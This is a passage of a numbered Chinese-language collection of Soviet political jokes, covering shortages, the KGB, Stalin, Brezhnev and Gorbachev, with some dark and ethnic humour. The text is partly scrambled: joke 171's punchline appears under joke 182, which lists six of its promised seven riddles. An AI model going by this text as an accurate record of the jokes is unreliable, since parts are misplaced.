戈尔巴乔夫视察一个集体农场，农场书记抱怨说：这里所有的小猪都长得不错，唯有一只总是病歪歪的。戈尔巴乔夫一听说到：交给我吧，同志。戈尔巴乔夫带回小猪弄了一周眼看不行了小猪要死掉了，于是大清早把小猪放在婴儿车里要丢掉，不巧碰上了米高扬，米高扬笑着说：总书记同志，这么早就出来啦！戈尔巴乔夫神色慌张的说：哦，可不是嘛，我的小孙子闹得不行，带出来透透气。米高扬走到婴儿车前看了一眼说：哦，多好的孩子，长的真像他爷爷！\n55: # 亚历山大、凯撤、拿破仑做为贵宾，参加红场阅兵。\n——我要是有苏联的坦克，我将是战无不胜的！亚历山大说。\n——我要是有苏联的飞机，我将征服全世界！凯撤说。\n——我要是有真理报，世界现在也不会知道滑铁卢！拿破仑说。\n56: # “苏联和英国的童话传说有什么不同？”\n“英国童话的开头通常是：‘很久很久以前……’而我们的则是；‘不远了，不远了……\n57: # 斯大林做报告说：……共产主义已经出现在苏联的地平线上了……\n老工人不知道什么是地平线，回家后问儿子，儿子说：地平线就是能看到却永远走不到的一条线。\n58: # ——社会主义制度的优越性在哪里？\n——成功地克服了在其它社会制度里不会存在的困难。\n59: # ——拉宾诺维奇，你经常读报纸吗？\n——当然，要不我怎么知道我们过着幸福的生活？\n60: # 一天戈尔巴乔夫到一个农场视察，看到有几头猪，就到猪旁边拍了一张照片。\n随行人员在照片上写上：戈尔巴乔夫和猪在一起，但又感到不妥。于是改成：猪和戈尔巴乔夫在一起，可还是感觉不对。最后把照片上的字改成：“左起第三位是戈尔巴乔夫”。\n61: # 苏联邮政发行历届领导人纪念邮票， 发行没 1 个月，邮政宣布紧急停止使用该邮票。\n理由是：寄信人不知道往哪面吐唾沫。\n62: # 一个美国人和苏联人比赛言论自由.美国人说：“我可以在白宫门前高喊‘打倒美帝国主义’。警察绝对不会抓我。”\n苏联人很不服气，说：“这有什么。我也可以在克林姆林宫门前高喊‘打倒美帝国主义’，警察也绝对不会抓我。”\n63: # 在集体农庄党的会议上将研究两个问题：建造木棚和建设共产主义。在没有木板的情况下，直接研究第二个问题。\n64: # “同志，你对这个问题有什么意见吗？”党支书问道。\n“对，我是有意见，但我不同意我的意见！”\n65: # 工人说:我们已经是共产主义了\n有人问:为什么?\n工人说:我们实现了各尽所能,各取所需的分配原则.\n什么?那人又问\n工人说:你没见我们的领导各取所需,工人各尽所能!\n66: # “在苏联是否可以存在两党制？”\n“不，不可能，因为我们养不起。”\n67: # ——什么在苏联是最常见的？\n——暂时的困难。\n68: # 苏联时期莫斯科卢比扬卡（克格勃总部）大楼外。\n一个愁眉苦脸的男子一边走路一边自言自语：肥皂没有，电池没有，袜子也没有。……\n这时旁边走过来一个看起来象是便衣的人小声对他说：公民同志，您要是再这样诋毁我们伟大的社会 z 主义国家，我就要拿手枪把敲你的脑袋了！\n那个男子看看便衣警察，继续自言自语：看看，连子弹也没有……\n69: # 在调查表上有这样一个问题：在执行总路线时你动摇过吗？\n拉宾诺维奇回答道：“我和总路线一起动摇。”\n70: # ——共产主义还有会货币吗？\n——南斯拉夫的修正主义者说会有，中国的教条主义者说没有，我们是辩证地看待这个问题：有，但不是所有人都有。\n71: # 拉宾诺维奇到资本主义国家出差，在那里，他给单位拍了一个电报：“我选择了自由。”这事发生后，单位马上召集了党代会谴责拉宾诺维奇，并要做出组织结论。在会议中间，拉宾诺维奇突然走进了会场！全场哑然。\n拉宾诺维奇说道：“我非常感兴趣，你们是怎样理解自由的。”\n72: # ——苏联人第六感的什么方面最发达？\n——高度的满足感。\n73: # ——为什么我们执行总路线那么慢 ?\n——因为每次党代会转的弯太大。\n74: # ——有 40 颗牙 4 条腿的是什么东西？\n——鳄鱼。\n——有 4 颗牙 40 条腿的是什么东西？\n——政治局\n75: # “假设你在酒吧里，而一个陌生人坐到你的身边并开始唉声叹气，你该怎么做\n“立即去阻止这种反苏宣传”\n76: # “共产主义实现时警察还存在吗？”\n“当然不。那时候所有公民都已经学会自己逮捕自己”\n77: # 一个苏联人家中总是被偷，于是很郁闷的问邻居：“什么时候我们家的东西才能不被偷？”\n邻居：“等到了共产主义社会就不被偷了。”\n“为什么？”\n“因为在社会主义阶段就已经被偷光了。\n78: # 苏联特工对美国特工夸口道：“我们知道你们国家所有核导弹发射井的位置。”\n美国特工说：“那又有什么，我们知道你们未来 20 年全体政治局委员名单。”\n79: # 亞美尼亞電台播放著機智問答說：\n「雞和蛋哪一個先有？」\n解答者在一旁暗暗地答道：「從前兩者都有。」\n80: # 一对夫妇生了一个孩子，如果长得像父母，那就是按反动的基因学说生出来的，如果长得像他们的邻居，那就是按照李森科的革命的环境决定学说生出来的。\n81: # 戈尔巴乔夫颁布限酒令后，想要买到酒只能在指定销售处排长队来买。\n一个莫斯科人排队排烦了，就嚷道：“我要到克林姆林宫把戈尔巴乔夫干掉。”然后转身离去。\n一会儿他有回来了，旁边人问他：“已经干掉了吗？”\n他说：“干什么干啊！那里的队比这里还长。”\n82: # “可能在美国建成共产主义吗？”\n“可能的。但是那样的话我们到哪里买粮食？”\n83: # “下次选举的结果会是怎样的？”\n“没有人知道。有人从中央委员会那里偷走了下次选举的确切结果\n84: # “为什么有人说匈牙利人喜欢苏联人而讨厌美国人？”\n“因为苏联人帮助匈牙利人摆脱了一次专制，而美国人没有解决另外一个”\n85: # 拉宾诺维奇在克里姆林宫里工作，他待在塔楼前望着远方，以便在共产主义到来时及时发出信号。美国人想要引诱他为他们工作，让它在经济危机到来时发出警告。拉宾诺维奇回答说：\n——不，我需要一个固定的工作。\n86: # 美国百万富翁买下苏联国家百货商场，并宜布要免费分发商品。\n很快百货商店和通向这里的道路就开始堵塞，并有许多因拥挤而死伤的人。人们问百万富翁问：\n——你为什么要这样做？\n——我非常感兴趣，当你们实行按需分配时会是什么样子。\n87: # ——为什么共产党员不能接受圣经？\n——根据圣经，先有混乱，然后根据上帝的计划引入秩序。共产主义的经验告诉我们，先有秩序，然后混乱就会到来\n88: # ——是什么原因决定了我们能在西方国家买那么多小麦？\n——要知道资本主义的最大缺点就是生产过剩。\n89: # 一个年轻的东德共产党员向他的首长提出了一个请求：他想得到移民西德的许可\n“为什么你竟然会想离开社会主义天堂，小同志？”\n“首长，我有一个主要的原因和一个次要的原因。次要原因是我知道我们党已经在民主德国建立了一个天堂，而我害怕这个天堂不能延续很久”\n“别担心！孩子，这里将永远是天堂”\n“那，好吧，首长，这就是我说的主要原因了”\n90: # 五一劳动节游行中，一个非常老的犹太人举着一个标语：“为了我快乐的童年时代，谢谢你，斯大林同志”\n党代表找到他：“那是什么 ？你在嘲弄我党吗？谁都可以看出，当年还是孩子的时候，斯大林同志还没有出生”\n“确切的说，那就是我感谢他的原因”\n91: # “美国的摩天楼真是全世界最高的吗？”\n“是的。但是苏联制造的晶体管是全世界最大的”\n92: # “如果我们放开西部边界管制的话，我们应该做什么？”\n“立即跑到西伯利亚以避免被踩死”\n93: # “为什么那个枪击政府豪华轿车的家伙会在红场打偏子弹？”\n“因为刚巧挨着他的公民们拼命抢那把枪并叫着：‘让我来射击！’\n94: # “为什么我国政府不急着登月？”\n“如果宇航员拒绝回来怎么办？”\n95: # “为什么巡警总是三人一队？”\n“这是专门的安排。一个会阅读，一个会写字，自然第三个要随时监视这两个知识分子”\n96: # 有人通过走关系，把列宁同志送到了天堂，这个无神论者被接纳了。\n过了几天，这人给上帝打电话表示感谢，电话接通了，他说：你是上帝吗?\n上帝回答：首先，没有上帝。其次，我们这里每个人都是同志。第三，有事请直说，我还要参加党代表会议。\n97: # 大西洋上某处，苏联和美国核潜艇碰巧在一处上浮出水。\n苏联潜艇的船员在甲板上没秩序地站着队，半醉的舰长生气地吼道：谁把靴子扔到控制台上去啦？我再问一遍：谁他妈把靴子扔到控制台上去啦？\n刚好美国潜艇甲板上的舰长听见了，与苏联舰长相比，他不仅刮了胡子而且精神抖擞。而他的手下更是秩序井然。\n显然他很自豪。他说：呵呵，这要是在我们美国——\n苏联舰长不耐烦地打断他：行啦，没有什么美国啦——我再问一遍，谁他妈把靴子扔到控制台上去啦？！\n98: # 勃列日涅夫在冬季奥运会上阅读讲话稿：”O-O-O-O-O。”\n“不，”他的助理向他低声道，“那是奥运会的标志。”\n99: # 来了一个格鲁吉亚代表团。他们被斯大林接见，谈话，然后离开，斯大林开始找他的烟斗，找不到。他叫贝利亚。\n“追代表团，找找谁拿了我的烟斗。”他说。\n贝利亚赶忙去追代表团。五分钟后，斯大林在一堆纸下找到了他的烟斗。他叫贝利：“瞧，我找到我的烟斗了。”\n“太晚了，”贝利亚说，”代表团中的半数已经承认他们拿了你的烟斗，另外一半在审讯中死掉了。”\n100: # 三个囚犯被送到了古拉格。他们开始谈论为什么他们会来到这里。\n“我来到这儿，是因为我上班总是迟到五分钟，他们指控我是在以怠工来破坏。”第一个说。\n“我来到这儿，是因为我上班总是早到五分钟，他们指控我是间谍”，第二个说。\n“我来到这儿，是因为我上班总是准时赶到，”第三个说，”他们指控我拥有一个西方制的手表。”\n101: # 一个美国人刚从莫斯科机场出来，他想打听一下时间。这时从身旁走过一位莫斯科人，手里拎着个沉重的箱子，很吃力的样子。美国人拦住了他，问他当地时间。莫斯科人放下箱子，抬手看了看表，一口气报出来现在的时间然后还有气压温度湿度等信息。美国人很吃惊，问道：这块表的功能可真多，是苏联的技术生产的吗？\n莫斯科人自豪地回答：是的，是我们苏联技术制造的。\n然后又吃力地重新拎起那个箱子接着说道：就是电池重了点。\n102: # 越战时期，河内物资奇缺，向苏联求救。\n苏联电：勒紧腰带。\n河内回电：请给腰带 。\n103: # 一位美国历史学家和一位俄罗斯历史学家，讨论谁领导二十世纪的前半世纪。\n“我投票赞成胡佛先生，”美国人说，“他尝试着教导我们美国人停止酗酒！”\n“那个没什么了不起！”俄国人接着说，“我选择斯大林，他尝试教我们俄国人不要吃饭。”\n104: # 一个年老的女演员想早一点获得国家演员的称号，人们就建议她入党。在入党仪式上人们问她怎么看共产主义。女演员说：所有东西都是充足的，不论是食品还是商品，还允许出国，总之，像在沙皇时代一样。\n105: # 问：为什么安德罗波夫，而后是契尔年柯在共产党会议上被一致推选？\n答：这是因为安德罗波夫的肾检验结果最差，契尔年柯的心电图最差。\n106: # 一个公民来参加契尔年柯的葬礼。有人向他要票，他答道：到这里来我用的是联票。\n107: # 在斯大林格勒更名为伏尔加格勒后，有另一个世界来了一封电报：”同意。约瑟夫•伏尔加”。\n108: # 列宁时代像是在隧道里，周围一片黑暗，只是在前面有光；在斯大林时代，像是在汽车里，一人领路，一半人在上坐着，另一半人在上颠簸；在赫鲁哓夫时代，就像在参观团里一样，一个人表演，其他人在笑；在勃列日涅夫时代，像看电影一样，大家都等着散场。\n109: # 问：为什么列宁穿皮鞋，斯大林穿靴子？\n答：列宁时代俄罗斯只脏到脚脖子。\n110: # 问：什么是全国的电气化？\n答：这就是共产主义减去苏维埃政权。\n问：听说苏联进军捷克斯洛伐克后，就会实现共产主义？是真的吗？\n答：是的，电气化在那里已经实现很多年了。\n111: # 问：从马克思主义的观点来看，什么是短缺？\n答：就是不被我们所感觉的客观现实。\n112: # 问：犹太人要入党要有什么条件？\n答：两个阿拉伯人的推荐。\n【苏联反犹主义盛行】\n113: # 拉宾诺维奇在战斗开始前声明：如果我死了，就追认我有党员吧！如果没死，就不用了。\n114: # 问：可以用收取的贿赂交党费吗？\n答：如果你是一个真正的共产党员，那就可以。\n115: # 上帝赐给人三种品质：忠诚，聪明，党性，但是任何一个人不会两种。\n因为人如果是聪明和真诚的，他就没有党性；如果他是忠诚和有党性的，他就不是聪明的；如果一个人聪明和有党性，那他就不是真诚的。\n116: # 问：在党的十二大上，关于住房问题有什么决议吗？\n答：增加列宁同志的住房面积。\n117: # 问：能光屁股坐在刺猬身上吗？\n答：可以，但只是在三种情况下：刺猬的刺被剃掉.是别人的屁股或者是党命令那样做。\n118: # 一个妇女在一个几家人合住的住宅的公用浴室里洗澡，而邻居站在走廊的一个小橙上通过门上的玻璃往里看，这个妇女发现后说道：看什么！没见过啊！邻居：我得看看，你是在用谁的肥皂！\n119: # 苏联一个桥梁专家访问罗马尼亚时被邀到自己罗马尼亚的同事家做客。客人夸奖主人的别墅非常豪华。主人把客人带到窗前：你见到了那座桥了吗？客人：看见了。主人：这就是原因所在！为了建造这座桥我节省了一些钱。\n过了一年，罗马尼亚工程师回访，他夸奖主人的别墅非常豪华，主人把客人带到窗前：你见到有桥了吗？罗马尼亚工程师：没见到。\n苏联桥梁专家：这就是原因所在！\n120: # 捷克人先是建造一个东西，剩下的偷光；而苏联人先是偷得差不多了，余下的用来建造。\n121: # 问：为什么在有苏联侨民的西方商店里会经常发生偷窃行为？\n答；这是因为他们的意识里有共产主义的残余。\n122: # 著名的俄罗斯歌唱家维尔京斯基，还是在沙皇时代离开俄罗斯的，这次，他又返回了俄罗斯，他带着两个手提箱从车箱里走出来，他放下皮箱，亲吻着大地，看着周围的人：俄罗斯啊，我都不认识你了！\n后来，他一看，皮箱不见了：俄罗斯啊，我认出你来了！\n123: # 问：什么国家最富？\n答：苏联。它已经被偷了五十多年了，但还没有被偷光。\n124: # 问：德国在马克思那里继承了什么？\n答：对于东德来说是共产党宣言，对于西德来说是资本主义。\n125: # 在苏兹达尔的考古发掘中发现了人们从来不知道的圣经的篇章：世界末日可以在单独的国家到来。\n126: # 勃列日涅夫问罗马教皇：为什么人们相信罗马天主教的天堂，而不相信共产主义的天堂？\n罗马教皇：这是因为我们的天堂从来没有让别人看到。\n127: # 一个乌克兰人被叫到克格勃，\n问：请你解释一下，你为什么经常有从以色列来的邮件？\n答：在战争时期，我曾藏匿过一个犹太人。\n问：你作为一个苏联的乌克兰人，怎么能收这些犹太姥的邮包！你也不为自己的将来着想。\n答：是，我想过，以后我还要藏中国人。\n128: # 问：听说在共产主义社会食品可通过电话订购，这是真的吗？\n答：但是发放的时候要通过电视机。\n129: # 请问，这就是共产主义，还是会更差劲？\n130: # 考古学家在挖掘一个石器时代的山洞，在入口处有一标语：万岁，奴隶制度，全人类的光明未来。\n131: # 问：听说在 1980 年在苏联会建成共产主义，这是真的吗？\n答：不，现在换成举办奥林匹克运动会。\n132: # 问：里海鳊是什么？\n答：这是鲸的一种，它能游到共产主义。如果游不到，说明它是反革命。\n133: # 问：怎么才能知道共产主义已经到来？\n答：将在广播和报纸上宣布。如果那时还剩电视的话，还会通过电视宣布。\n134: # 如果你是外交官，你可以一直在国外；\n如果你是科学家，你可以每年出一次国；\n如果你是运动员，你可以四年出一次国；\n如果你是军人，你要 12 年才能出一次国。（44 年卫国战争反攻，56 年波匈事件，68 年布拉格之春，79 年阿富汗）\n135: # 两个中学同学相遇然后寒暄。\n“您现在在哪工作”\n“中学老师.您呢?”\n“克格勃。”\n“啊，您在克格勃具体干什么？”\n“我们负责揪出那些对国家不满的家伙。”\n“您的意思是……还有人比较满意？”\n“哦，那些人不归我们管，负责管他们的是纪委。”\n136: # 一位年轻人在工作时抱怨道：“这种政府真差劲。”\n结果被一位秘密警察听到而遭逮捕。\n年轻人辩解说：“我根本没讲是哪个政府，你怎么可以随便逮捕我呢？”\n“你少骗人，”秘密警察咆哮道，“我在这里工作二十多年了，哪一个政府差劲我不会知道吗？”\n137: # 个美国人和一个苏联人被判下地狱。恶魔告诉他们：“你们有两个选择：美国式和苏联式的地狱。在美国式的地狱中，你们什么都可以做，但是每天早上必须吃一桶屎。而在苏联式的地狱中，也可以想干什么就干什么，不过每天早上得吃两桶屎。”\n美国佬马上选了美国式的地狱。而苏联人则最终选择了自己的祖国。一周后他们又相遇了，苏联人问：“你那如何？”\n美国人回答：“确实如恶魔说的那样。我的地狱还不错。就是每天一桶屎简直要我命。你那呢？”\n差不多和你那一样。就是搞不清楚我们那是屎尿遇见了短缺还是有人把桶都偷跑啦”\n138: # 勃列日涅夫发表广场演说，群众听见“……勃列日涅夫同志的逝世令我们非常难过……”，一片哗然。\n勃列日涅夫似乎发现了什么，把手伸进口袋摸了一下。\n“同志们，对不起，离开政治局的时候，我穿了安德罗波夫同志的西装。”\n139: # 克格勃审核\n“你爱你的太太吗？”主考官问。\n“是的。”\n“你爱你的国家吗？”主考官又问。\n“是的。”\n“那一个是你的最爱？”主考官问。\n“国家。”\n“好，我们将带你的老婆到这里，你拿这把枪到隔壁房去杀了她。”\n这男子到了隔壁房，没多久便传出６声枪响，接着又传出压碎声持续着数分钟；\n此男子带着松垮的领带走出房间，他将手枪放在桌上，主考官看着他\n并问：“发生什么事？”\n他说：“你给我的枪都装着空包弹，我只好勒死她。”\n140: # 赫鲁晓夫访问一所学校。他问一名学生：”你的父亲是谁？“\n他回答说：”是共产主义！“\n赫鲁晓夫很满意，他又问：”你的母亲是谁？“\n他回答说：”是苏联！“\n赫鲁晓夫又问：”你长大了想当什么？”\n学生说：“孤儿。”\n141: # 列宁表明该如何管理国家\n斯大林表明该如何不管理国家\n赫鲁晓夫试图表明谁都能管理国家\n勃列日涅夫正在表明国家是根本不需要管理的\n142: # 1937 年苏联当局征求诗人普希金的逝世百年纪念铜像设计，\n佳作有以下三件：\n站在高加索山上眺望远方的普希金，\n决斗时被子弹击中即将倒下的普希金，\n艺术女神替普希金戴上月桂冠。\n但是，优胜作品是\u0026hellip;.\n正在阅读普希金作品的斯大林同志。\n143: # 列车员叫醒一个靠着窗口睡着了的旅客:“同志，你的票子？” “票？什么票？我没有票子！” “没票？那你打算去哪里？” “我什么地方也不想去！” “那你为什么上这列火车？” “上车前，克格勃的同志们刚在大庭广众之下逮捕了一名间谍，大家都在看热闹，我也在看，后来其中一个领头的同志对着我叫到：‘没什么好看的，快上车坐好！’于是我只好走进车厢……”\n144: # 一个盲人在路上遇到了贝利亚同志。 “您好，贝利亚同志！”盲人抢先打招呼。 “怎么，您看得见我？”贝利亚同志心里很纳闷。 “不，贝利亚同志，那是因为给我引路的狗直往后退的缘故。”\n145: # 拉宾诺维奇出差，要到三个城市去，它们是：华沙，布拉格，还有巴黎。华沙和布拉格是苏联控制的。 到了华沙，他发给单位一封电报，写着：”自由的华沙万岁！拉宾诺维奇。“ 到了布拉格，他发给单位一封电报，写着：”自由的布拉格万岁！拉宾诺维奇。“到了巴黎，他又发给单位一封电报，写着：”巴黎万岁！自由的拉宾诺维奇。\n146: # 在一次记者招待会上，有以下问答：\n问：“今年诺贝尔奖获得者是谁？”\n答：“赫鲁晓夫。”［当时的苏共中央总书记］\n问：“赫氏有何成就？”\n答：“他是第一个在西伯利亚播种，去加拿大收获的人。”\n147: # 有一次，著名的歌唱家科兹洛夫斯基得知斯大林很赏识他，便向斯大林提出一个请求：“我从来没有去过国外，所以我想……”\n“你不会出逃吧？”\n“瞧您说的，斯大林同志！对我来说，家乡的村庄比外国可要亲得多。”\n“不错，好样的！那你就回家乡去吧。”\n148: # 某日，戈尔巴乔夫召开国民大会:同道们!目前国内形势有些紧张，看大家谅解！一个工人站起曰：我们保证按时上班！戈尔巴乔夫大悦，继续说：再过些时日，大家会更紧张，也许会有人受饿！工人又说：我们可延长时间干！戈尔巴乔夫有些感动：随时间发展，大概会有失业现象。工人回答：没关系，我们将加班玩命的工作。戈热泪盈眶：谢谢，但是最后也许会有人饿死！工人大声说：我们２４小时连续工作，怎么样，总书记？！戈狂奔下主席台，牢牢握住该人的手，说：…我…我该该我该怎麽说呢，您从事何种职业。工人受宠若惊，面露难色说：我……我…我是火葬厂的！\n149: # 有一次，朱可夫从斯大林的办公室里出来时，怒气冲冲地说：“小胡子魔鬼!”正在接待室的贝利亚听到了这句话，他走进斯大林的办公试冬把这话告诉了斯大林。 斯大林让人把朱可夫叫了回来。“朱可夫同道，您从我办公室出往时说了一句‘小胡子魔鬼’，您是在说谁?”“希特勒!我还能说准呢？斯大林同道！”“贝利亚同道，而您又是在说谁呢?”\n150: # “第三次世界大战会发生吗？”“不会！不过争取和平的努力会达到这样的程度：全世界都不会有一块石头保持完整！”\n151: # 假如鳄鱼吃了勃烈日涅夫会有什么结果？答案是：鳄鱼会连着屙一个星期的勋章。\n152: # 勃列日涅夫的噩梦：\n捷克人坐在红场上吃犹太薄饼——用筷子。\n153: # 戈尔巴乔夫在别墅与赖莎一起度假。早上，戈尔巴乔夫穿着条内裤走到阳台上呼吸新鲜空气。\n“亲爱的，回来穿上睡衣。”赖莎喊道。\n“赖莎，你是怎么隔着两间屋子看到我的？”\n“不，我在听自由欧洲电台。”\n154: # 一天晚间。完成了一天的工作，雅科夫·米哈伊洛维奇·斯维尔德洛夫来弗拉基米尔·列宁的书房小坐。\n“弗拉基米尔·伊里奇，我们要么开一瓶？”斯维尔德洛夫问。\n“不干。我绝不再这样了！”列宁断然拒绝，“绝不！”\n“得了吧，弗拉基米尔·伊里奇！就我们两个！……上次我们开了两瓶，什么也没发生啊？”\n“还什么都没发生呢！你和捷尔仁斯基回去睡觉去了，可我却爬到辆装甲车顶上，扯了一顿屁话……”\n155: # 苏联的家具厂生产一种新型号的床：“共产主义型号”。床能轻松塞下三个人，而床沿上则刻着标语：“列宁总与你同在！”\n156: # 一艘苏联货船被食人族海盗劫持，海盗准备把所有的海员吃掉。船长问道：\n“亲爱的食人族同志，你们有过集体化吗？”\n“没有！”\n“你们有过个人崇拜吗？”\n“没有！”\n“你们有过十月节吗？”\n“没有！”\n“好吧，那我就真的不能理解你们为什么这么残忍了……”\n157: # 勃列日涅夫在电视上对公众讲话：\n“近日在莫斯科有恶毒的流言说我的警卫开的车里不是我而是个假人。我必须得说这是相当肮脏的谎言！他们在给我开车，而不是假人！”\n158: # 勃列日涅夫在向工人们讲话：\n“很快我们就能生活得更好！”\n台下传来一个声音：\n“我们怎么办？”\n159: # 勃列日涅夫坐车在莫斯科街头闲逛，突然看到一座纪念碑。\n“这座纪念碑是谁的？”\n“契诃夫的，列昂尼德·伊里奇。”\n“哦，很好。我读过他的《姆姆》。”\n“抱歉，列昂尼德·伊里奇，《姆姆》不是契诃夫写的，而是屠格涅夫。”\n“哦，真的么？那这可真蠢。”勃列日涅夫评论道，“《姆姆》是屠格涅夫写的，可契诃夫却得到了纪念碑！”\n160: # 科学家联名要求赫鲁晓夫去领导一个癌症治疗所。赫鲁晓夫推脱道：“谢谢同志们的支持，但我对癌症一窍不通啊。”\n科学家们纷纷说道：“赫鲁晓夫同志，您只要应用一下您在农业问题上的经验就好了！您一负责，粮食就全不见了！”\n161: # -为什么在斯大林的遗体被移出列宁墓后，陵墓的看守反而加倍了？\n-因为他们发现赫鲁晓夫曾经抱着铺盖卷在附近晃悠。\n162: # 塔斯社通讯：\n“……昨天在莫斯科发生了一起针对勃列日涅夫同志的失败暗杀事件。子弹穿透汽车的防弹玻璃，击中勃列日涅夫同志胸前的勋章，随后反弹并打死了司机。”\n163: # 科学家发明了一种电脑，能够计算出与共产主义的距离。在勃列日涅夫的监督下，科学家输入了所有的信息，计算机开始计算。一天、两天，三天……最终计算机得出了结果并打在了卡带上：18 千米。\n科学家十分震惊。肯定是算错了！他们重来了一次，还是这个数字！\n学院的锅炉工突然懂了什么：\n“同志们，朋友们，数据没有错！勃列日涅夫同志告诉过我们，每一个五年计划都能让我们向共产主义迈进一步！”\n164: # 尼克松先生访问莫斯科，赫鲁晓夫带着他参观首都，尤其是各个新建住宅区。\n“那些是什么？”尼克松突然问道。\n“你什么意思啊？”赫鲁晓夫傲慢地反问，“电视机。”\n“好啊！”尼克松赞叹道，“你们不只已经赶上了我们，在一些地方甚至已经超过了我们。”\n“哪里？”赫鲁晓夫欣喜若狂。\n“比如说吧，我们从不在猪圈里安装电视机。”\n165: # 斯大林就要死了，他把赫鲁晓夫招来：\n“尼基塔·谢尔盖耶维奇，我知道你会继承我并超越我，”斯大林说，“我给你准备了两封信。如果你遇到了危机，就拆开第一封；如果再遇到，就拆开第二封。”\n赫鲁晓夫拿走了两封信。1956 年，他遇到了匈牙利和苏伊士危机。于是赫鲁晓夫拆开了第一封信，上面写着：“都怪在我头上！”于是苏共二十大召开，斯大林主义终结了。\n1964 年，赫鲁晓夫又碰上了勃列日涅夫和柯西金的政变，于是他拆开第二个，只见上面写着：\n“准备两封信。”\n166: # 问：能够用香蕉当指南针吗？\n答：可以。把香蕉放在柏林墙上，香蕉被从哪边抽走哪边就是东边。\n167: # “奶奶，列宁好吗？”\n“当然，孙子，他很好。”\n“斯大林呢？他坏吗？”\n“坏，当然坏。”\n“赫鲁晓夫呢？他怎么样？”\n“等他死了，我们就知道了。”\n168: # 党代会。斯大林发言：\n“今天我们有两个问题要讨论。第一，我们需要枪毙所有的政治局委员。第二，我们需要把列宁墓涂成亮绿色。”\n观众席中传来了一个怯怯的声音：\n“为什么涂成亮绿色？”\n“很好，我就知道大家对问题一没有不同意见。”\n169: # 在入党审批过程中有一个问题是：“你怎么看待苏联政府？”\n一人回答：“就像看待我妻子一样。”\n“怎么解释？”\n“第一，我爱她；第二，我怕她；第三，我想换一个。”\n170: # 在莫斯科红场，人们正排队参观列宁墓卫兵换岗。一个小孩问：\n“爸爸，为什么他们总是要看守这陵墓？”\n“他们不是一直说吗？”父亲答道，“列宁是永生的。如果他看不下去了决定出来怎么办？”\n171: # 为了解决黄油短缺问题，政治局要求苏联科学家研究技术，把粪便做成黄油，并在十月革命周年纪念期间完成。在六个月的工作之后，政治局要求进展报告。科学家报告称他们实现了 50%的成功。政治局要求解释，答复如下：\n172: # 斯大林招来著名作家肖洛霍夫。\n“我已经读了你的小说《新垦地》。写得非常好，我喜欢。我想，你为啥不写一篇文章，就叫《敌人不投降，就叫他灭亡》？”\n“我害怕我写不好，斯大林同志。最近我的健康状况不好。”\n“我们会帮你的。我们会把你送到格鲁吉亚去，那里有酒有葡萄。”\n“好吧，斯大林同志。那请让我和家人到个别。”\n“为什么？”\n“我怕我的文章不成功。”\n173: # 一个外国代表团突击访问了一个集体农庄。没时间准备。代表团走后，集体农庄主席拉过区党委书记说：\n“你们没提前告诉我，所以他们都看见了。牛栏的废墟，那些灰尘，我们的贫穷。”\n“别担心。”党书记说道。\n“不过他们现在就能传的满世界都知道啊。”\n“那就让他们沉浸在一贯的造谣中伤里吧。”党书记答道。\n174: # 在格鲁吉亚共和国的学校中，老师正在让学生说说自己的父亲。\n“图拉什维里，说说你的父亲。”\n“我爸爸种橘子。他把它们带到莫斯科销售，赚了不少钱。”\n“你了，布里泽。”\n“我爸爸种月桂叶。他把它们带到莫斯科销售，赚了不少钱。”\n“你了，克里维泽。”\n“我爸爸在反贪污和投机倒把分局工作。每次布里泽和图拉什维里的爸爸去莫斯科的时候都回去看看我爸爸。因此他赚了不少钱。”\n“你了，查维查瓦泽。”\n“我爸爸是生物工程师。”\n全班大笑。\n“孩子们。”老师严肃地说，“不要把快乐建立在别人的悲伤之上。”\n175: # 全世界进行对关于大象的最佳书籍的评奖大赛。\n法国人递交了一册精装的《大象家庭内的三角恋研究》\n英国人提交了一套《大象与世界贸易》\n德国人提交了 24 卷本的一套《大象学综介》\n美国发放了一百万份传单，上面写着：“赢大象，不需购买。”\n苏联提交了三卷书，题目如下：\n《第 1 卷：大象在伟大的十月社会主义革的命中的作用》\n《第 2 卷：大象在世界上最进步的苏联社会的光芒中的快乐生活》\n《第 3 卷：苏联——大象的祖国》\n176: # 一个卫兵问政治犯：\n“刑期多久？”\n“十年。”\n“犯了什么罪？”\n“没犯罪。”\n“你撒谎！没犯罪他们只给判 5 年！”\n177: # 一个日本工人被派到俄罗斯维修日本产的机械。日本人每天工作 8 小时，不和别人说话。一个月后他的工作期满。在他返回日本之前，日本人眼含泪水地对大家说：“我道歉，我的好工人同志们。我知道工人们应该团结起来，但我有合同在身，我不得不工作，我为没有参与你们的长期罢的工而向你们正式道歉！”\n178: # 苏联人、法国人和美国人争论什么是最勇敢的人。\n美国人说：“举例来讲，我们有十辆汽车，其中一辆没有刹车。我们抽签，每人搭一辆开山路。最后我们中的一个人住院，另外九个去看他。”\n“这不算什么。”法国人说，“我们选 10 个女孩，其中有 1 个有艾滋病。我们抽签，一人找一个女孩。最后一个人住院，另外九个去看他。”\n苏联人说：“我们聚在公寓里，即便知道我们中有一个告密者。我们讲了一晚上政治笑话，然后九个人进了监狱，另外一个去看他们。”\n179: # 一个人把自己的车停在了莫斯科红场上。卫兵赶快跑来，向他怒吼：\n“你疯了么？这是政府所在地！”\n“没问题。”那人答道，“我的锁很结实。”\n180: # 一个妇女走进食品商店。\n“你们卖肉吗？”\n“没有。”\n“牛奶呢？”\n“我们这儿只处理肉，对面那家才是没有牛奶的。”\n181: # 在奥运会上，苏联掷铁饼（注：在英文中铁饼实为“锤子”，Hammer）选手打破了世界纪录。记者采访他问：\n“你是怎么把锤子抛的那么远的？”\n“如果再搭上个镰刀，我能扔出两倍远。”\n182: # 苏联社会七大谜题：\n1、总是没人工作，计划却总是完成；\n2、计划总是完成，可（商店）柜台总是空的；\n3、柜台总是空的，可却没人挨饿；\n4、没人挨饿，可所有人都不高兴；\n5、所有人都不高兴，可是没人抱怨；\n6、没人抱怨，可是监狱却人满为患。\n“人们已经可以把它涂在面包上，但尚不会去吃。”\n183: # 一只兔子在街上狂奔。\n“你跑得这么快，慌什么？”熊问。\n“你不知道么？他们现在在逮捕所有的骆驼，还要阉割他们。”\n“可你是兔子不是骆驼啊。”\n“对，不过假设他们逮到你，在他们阉掉你之后你就能证明你不是骆驼了！”\n184: # 一个犹太人申请移民去以色列。据他说，他的哥哥在以色列病得很重，需要帮助。办公室的官员问他：\n“那为什么不让你的哥哥来这里，而要你亲自过去？”\n“我的哥哥是得了病，但还没有得精神病。”\n185: # 问：什么被允许，什么被禁止？\n答：在英国被允许的被允许，被禁止的被禁止；在美国不被禁止的都被允许；在德国不被允许的都被禁止；在法国什么都被允许，包括被禁止的；在苏联什么都被禁止，包括被允许的。\n186: # 